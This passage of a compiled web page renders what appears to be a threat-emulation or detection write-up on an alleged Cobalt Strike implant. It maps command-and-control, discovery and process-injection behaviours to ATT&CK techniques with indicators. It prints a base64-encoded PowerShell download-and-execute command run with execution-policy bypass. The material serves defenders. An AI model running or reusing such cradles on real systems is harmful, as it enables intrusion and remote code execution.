minutes)."),(0,r.kt)("td",{parentName:"tr",align:null},(0,r.kt)("em",{parentName:"td"},"Process Created"),": ",(0,r.kt)("br",null),"- ",(0,r.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Roaming\\\\mslibupdate.exe"))),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null}),(0,r.kt)("td",{parentName:"tr",align:null},(0,r.kt)("em",{parentName:"td"},"PE file")," attempted to read ",(0,r.kt)("em",{parentName:"td"},"Windows Registry"),"."),(0,r.kt)("td",{parentName:"tr",align:null})))),(0,r.kt)("h4",{id:"notes-2"},"Notes"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"#{user} ran C:","\\","Users","\\","#{user}","\\","AppData","\\","Roaming","\\","mslibupdate.exe, which accessed HKLM","\\","SYSTEM","\\","CONTROLSET001","\\","SERVICES","\\","BAM\\STATE","\\","USERSETTINGS","\\","S-1-5-21-3721850961-3849296161-1077157389-252077","\\",', violating the rule \\"Modifying the Services registry location\\". Access was allowed because the rule was not configured to block.')),(0,r.kt)("h3",{id:"threat-actor-used-alleged-cobalt-strike-implant-for-stablishing-http-network-connections-for-command-and-control"},"Threat actor used ",(0,r.kt)("em",{parentName:"h3"},"alleged Cobalt Strike implant")," for stablishing HTTP network connections for Command And Control."),(0,r.kt)("h4",{id:"tactic-4"},"Tactic"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Command And Control")),(0,r.kt)("h4",{id:"techniques-4"},"Techniques"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"T1071.001 - Application Layer Protocol: Web Protocols")),(0,r.kt)("h4",{id:"behaviors-and-observables-4"},"Behaviors and Observables"),(0,r.kt)("table",null,(0,r.kt)("thead",{parentName:"table"},(0,r.kt)("tr",{parentName:"thead"},(0,r.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,r.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,r.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,r.kt)("tbody",{parentName:"table"},(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"T1071.001"),(0,r.kt)("td",{parentName:"tr",align:null},(0,r.kt)("em",{parentName:"td"},"mslibupdate.exe")," opened network connection public server."),(0,r.kt)("td",{parentName:"tr",align:null},(0,r.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,r.kt)("inlineCode",{parentName:"td"},"13.214.87[.]25"),(0,r.kt)("br",null),(0,r.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,r.kt)("inlineCode",{parentName:"td"},"outruncancer[.]org"))),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"T1071.001"),(0,r.kt)("td",{parentName:"tr",align:null},(0,r.kt)("em",{parentName:"td"},"mslibupdate.exe")," issues HTTP GET command to download javascript file via proxy."),(0,r.kt)("td",{parentName:"tr",align:null},(0,r.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,r.kt)("inlineCode",{parentName:"td"},"10.2.8[.]31"),(0,r.kt)("br",null),(0,r.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,r.kt)("inlineCode",{parentName:"td"},"outruncancer[.]org"))))),(0,r.kt)("h4",{id:"notes-3"},"Notes"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"GET /pb/web/40.12.1.337/simpleloader.js HTTP/1.1")),(0,r.kt)("h3",{id:"threat-actor-used-alleged-cobalt-strike-implant--to-launch-powershell-encoded-commands-for-defense-evasion"},"Threat actor used ",(0,r.kt)("em",{parentName:"h3"},"alleged Cobalt Strike implant"),"  to launch ",(0,r.kt)("em",{parentName:"h3"},"PowerShell")," encoded commands for Defense Evasion."),(0,r.kt)("h4",{id:"tactic-5"},"Tactic"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Defense Evasion")),(0,r.kt)("h4",{id:"techniques-5"},"Techniques"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"T1059.001 - Command and Scripting Interpreter: PowerShell")),(0,r.kt)("h4",{id:"behaviors-and-observables-5"},"Behaviors and Observables"),(0,r.kt)("table",null,(0,r.kt)("thead",{parentName:"table"},(0,r.kt)("tr",{parentName:"thead"},(0,r.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,r.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,r.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,r.kt)("tbody",{parentName:"table"},(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null}),(0,r.kt)("td",{parentName:"tr",align:null},(0,r.kt)("em",{parentName:"td"},"mslibupdate.exe")," spawned ",(0,r.kt)("em",{parentName:"td"},"PowerShell"),"."),(0,r.kt)("td",{parentName:"tr",align:null},(0,r.kt)("em",{parentName:"td"},"Process Created"),": ",(0,r.kt)("br",null),"- ",(0,r.kt)("inlineCode",{parentName:"td"},"powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAH QAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAU wB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwA C4AMAAuADEAOgA1ADUANgA5ADMALwAnACkAOwAgAEkAbgB2AG8AawBlAC0ARABBAEMAa ABlAGMAawAgAC0ASQBuAGkAdABpAGEAbAAgAFQAcgB1AGUA"))),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"T1059.001"),(0,r.kt)("td",{parentName:"tr",align:null},(0,r.kt)("em",{parentName:"td"},"PowerShell")," attempted to spawn ",(0,r.kt)("em",{parentName:"td"},"conhost.exe"),"."),(0,r.kt)("td",{parentName:"tr",align:null},(0,r.kt)("em",{parentName:"td"},"Process Created"),": ",(0,r.kt)("br",null),"- ",(0,r.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\conhost.exe"))))),(0,r.kt)("h3",{id:"threat-actor-used-alleged-cobalt-strike-implant--to-run-ipconfig-for-discovery"},"Threat actor used ",(0,r.kt)("em",{parentName:"h3"},"alleged Cobalt Strike implant"),"  to run ",(0,r.kt)("em",{parentName:"h3"},"ipconfig")," for Discovery."),(0,r.kt)("h4",{id:"tactic-6"},"Tactic"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Discovery")),(0,r.kt)("h4",{id:"techniques-6"},"Techniques"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"T1018 - Remote System Discovery"),(0,r.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell")),(0,r.kt)("h4",{id:"behaviors-and-observables-6"},"Behaviors and Observables"),(0,r.kt)("table",null,(0,r.kt)("thead",{parentName:"table"},(0,r.kt)("tr",{parentName:"thead"},(0,r.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,r.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,r.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,r.kt)("tbody",{parentName:"table"},(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"T1018"),(0,r.kt)("td",{parentName:"tr",align:null},(0,r.kt)("em",{parentName:"td"},"mslibupdate.exe")," spawned ",(0,r.kt)("em",{parentName:"td"},"ipconfig"),"."),(0,r.kt)("td",{parentName:"tr",align:null},(0,r.kt)("em",{parentName:"td"},"Process Created"),": ",(0,r.kt)("br",null),"- ",(0,r.kt)("inlineCode",{parentName:"td"},"ipconfig  /all"))),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"T1059.003"),(0,r.kt)("td",{parentName:"tr",align:null},(0,r.kt)("em",{parentName:"td"},"mslibupdate.exe")," spawned ",(0,r.kt)("em",{parentName:"td"},"CMD"),"."),(0,r.kt)("td",{parentName:"tr",align:null},(0,r.kt)("em",{parentName:"td"},"Process Created"),": ",(0,r.kt)("br",null),"- ",(0,r.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C ipconfig /all"))))),(0,r.kt)("h3",{id:"threat-actor-used-alleged-cobalt-strike-implant--to-inject-into-system-processes-for-defense-evasion"},"Threat actor used ",(0,r.kt)("em",{parentName:"h3"},"alleged Cobalt Strike implant"),"  to inject into system processes for Defense Evasion."),(0,r.kt)("h4",{id:"tactic-7"},"Tactic"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Defense Evasion")),(0,r.kt)("h4",{id:"techniques-7"},"Techniques"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"T1055 - Process Injection")),(0,r.kt)("h4",{id:"behaviors-and-observables-7"},"Behaviors and Observables"),(0,r.kt)("table",null,(0,r.kt)("thead",{parentName:"table"},(0,r.kt)("tr",{parentName:"thead"},(0,r.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,r.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,r.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,r.kt)("tbody",{parentName:"table"},(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"T1055"),(0,r.kt)("td",{parentName:"tr",align:null},(0,r.kt)("em",{parentName:"td"},"mslibupdate.exe")," spawned ",(0,r.kt)("em",{parentName:"td"},"dllhost")," without commandline arguments."),(0,r.kt)("td",{parentName:"tr",align:null},(0,r.kt)("em",{parentName:"td"},"Process Created"),": ",(0,r.kt)("br",null),"- ",(0,r.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\dllhost.exe"))),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"T1055"),(0,r.kt)("td",{parentName:"tr",align:null},(0,r.kt)("em",{parentName:"td"},"mslibupdate.exe")," injected ",(0,r.kt)("em",{parentName:"td"},"dllhost")),(0,r.kt)("td",{parentName:"tr",align:null})))))}c.isMDXComponent=!0}}]);